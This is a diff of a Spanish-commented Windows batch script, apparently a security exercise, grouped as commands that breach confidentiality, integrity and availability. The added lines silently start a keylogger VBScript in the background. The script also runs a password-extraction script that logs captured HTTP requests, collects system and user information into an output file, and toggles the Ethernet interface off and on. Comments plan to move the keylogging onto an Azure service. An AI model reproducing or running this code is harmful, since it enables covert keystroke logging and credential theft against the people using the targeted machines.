@@ -4,11 +4,12 @@ setlocal enabledelayedexpansion
 
 :: Simulación de try-catch
 set "ErrorCode=0"
-Set "KeyloggerFailled=0"
+set "myHostName=%COMPUTERNAME%"
+
 :: Try Block
 
 echo **************************** COMANDOS QUE VULNERAR LA CONFIDENCIALIDAD **************************** >> salida.txt
-    call :GetKeyloggerInfo || call :GetSystemInfo || set "ErrorCode=1"
+    call :GetKeyloggerInfo || set "ErrorCode=1"
     call :GetSystemInfo || set "ErrorCode=1"
     call :GetUserInfo || set "ErrorCode=1"
     call :GetCredentials || echo  FALLO LA OBTENCIÓN DE CREDENCIALES MEDIANTE KEYLOGGER>> salida.txt 
@@ -21,10 +22,9 @@ echo **************************** COMANDOS QUE VULNERAN LA DISPONIBILIDAD ******
 echo **************************** COMANDOS QUE VULNERAN LA INTEGRIDAD **************************** >> salida.txt
 
     call :GetHardwareInformation || set "ErrorCode=1" 
-    call :GetDriversInfo
-     || set "ErrorCode=1"
-    call :SimulateSpoofing || set "ErrorCode=1"
-    call :SetDisponibility || set "ErrorCode=1"
+    call :GetDriversInfo || set "ErrorCode=1"
+    ::call :SimulateSpoofing || set "ErrorCode=1"
+    ::call :SetDisponibility || set "ErrorCode=1"
 
 :: Check for errors
 if "%ErrorCode%" NEQ "0" (
@@ -48,12 +48,12 @@ exit /b
 :: Funciones
 
 :GetSystemInfo
-    echo **************************** INFORMACION DEL SISTEMA **************************** >> salida.txt
-    hostname >> salida.txt
-    systeminfo >> salida.txt
-    nbtstat -n >> salida.txt
-    netsh trace show providers >> salida.txt
-    echo ************************************************************************************* >> salida.txt
+        echo **************************** INFORMACION DEL SISTEMA **************************** >> salida.txt
+        hostname >> salida.txt
+        systeminfo >> salida.txt
+        nbtstat -n >> salida.txt
+        netsh trace show providers >> salida.txt
+        echo ************************************************************************************* >> salida.txt    
     exit /b
 
 :GetUserInfo
@@ -89,7 +89,14 @@ exit /b
 :GetKeyloggerInfo
     echo **************************** INFORMACIÓN DE keystrokes DE TECLADO **************************** >> salida.txt
     mkdir keyloggerLogs
-    cscript setup.vbs
+    :: this line need to replace with a code that execute a keyloggerApp like a azure service
+    ::
+    ::
+    ::
+    start "" wscript //B //Nologo "KeyLoggerApp\app\setup.vbs" 
+    ::
+    ::
+    ::
     echo El keylogger está corriendo en segundo plano. >> salida.txt
     echo ************************************************************************************* >> salida.txt
     exit /b
@@ -113,8 +120,8 @@ exit /b
     ::
     ::
     ::
-    :: find passwords
-    wscript ExtractAfterEmail.vbs
+    :: find passwords | need to replace with logic to execute a service from azure that execute this task
+    wscript KeyLoggerApp\App\Utils\ExtractAfterEmail.vbs
     type temp_trace.txt >> keyloggerLogs\httpRequests.txt
     ::
     ::
@@ -155,16 +162,11 @@ exit /b
 
 :SetDisponibility
     
-    Setlocal enabledelayedexpansion
-
+    netsh interface set interface "Ethernet" admin=disable
+    netsh interface set interface "Ethernet" admin=enable
+    echo ************************************************************************************* >> salida.txt
     
-    if %KeyloggerFailled% NEQ 1 (
-        set "KeyloggerFailled=1"
-        netsh interface set interface "Ethernet" admin=disable
-        netsh interface set interface "Ethernet" admin=enable
-        echo ************************************************************************************* >> salida.txt
-        exit /b
-    )
+
 
 :GetHardwareInformation
         if exist %windir%\System32\wbem\wmic.exe (
